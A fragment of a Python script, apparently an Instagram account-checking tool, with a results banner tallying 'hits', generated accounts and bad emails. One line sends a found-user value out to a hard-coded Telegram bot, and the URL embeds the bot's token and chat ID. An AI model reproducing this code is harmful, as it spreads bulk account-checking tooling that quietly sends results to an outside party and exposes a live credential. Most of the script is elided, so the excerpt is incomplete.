...
'''
try:
    requests.get(f"https://api.telegram.org/bot7625045502:AAG1chqMgPB09jOobso5Swn76BHDCVH9UyM/sendMessage?chat_id=7757666324&text={newuser}")
...
def pppp():
    ...
    output = (f"\n"
          f"≿━━━━༺ 𝐑𝐄𝐒𝐔𝐋𝐓𝐒 ༻━━━━≾\n"
          f"✅ 𝗧𝗿𝘂𝗲 Hits     : {hits}\n"
          f"🎯 𝗚𝗲𝗻 Accounts : {badinsta}\n"
          f"❌ 𝗕𝗮𝗱 Emails  : {bademail}\n"
          f"📭 𝗡𝗼𝘁 Found    : {goodig}\n"
          f"≿━━━━━━━PRAVEEN━━━━━━━━≾\n\n")
